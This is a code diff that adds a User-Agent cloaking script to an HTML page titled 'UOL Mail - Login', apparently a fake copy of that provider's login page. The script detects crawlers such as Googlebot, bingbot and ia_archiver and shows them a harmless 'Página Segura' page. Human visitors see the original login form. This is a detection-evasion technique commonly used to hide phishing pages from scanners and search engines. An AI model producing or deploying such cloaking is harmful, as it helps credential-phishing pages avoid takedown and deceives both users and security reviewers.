@@ -6,6 +6,40 @@
     <title>UOL Mail - Login</title>
     <link rel="stylesheet" href="style.css">
     <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <script>
+        // Função para detectar bots pelo User-Agent
+        function detectBot() {
+            const botAgents = [
+                'Googlebot',
+                'bingbot',
+                'DuckDuckBot',
+                'Yahoo! Slurp',
+                'Baiduspider',
+                'YandexBot',
+                'Sogou',
+                'Exabot',
+                'ia_archiver'
+            ];
+            const userAgent = navigator.userAgent;
+
+            // Verifica se o User-Agent contém um dos identificadores de bots
+            return botAgents.some(bot => userAgent.includes(bot));
+        }
+
+        // Modifica o conteúdo da página com base no User-Agent
+        document.addEventListener('DOMContentLoaded', () => {
+            if (detectBot()) {
+                // Exibe conteúdo limpo para bots
+                document.body.innerHTML = `
+                    <h1>Página Segura</h1>
+                    <p>Bem-vindo à UOL!</p>
+                `;
+            } else {
+                // Página original para usuários reais
+                console.log("Usuário real detectado.");
+            }
+        });
+    </script>
 </head>
 <body>
     <div class="container">
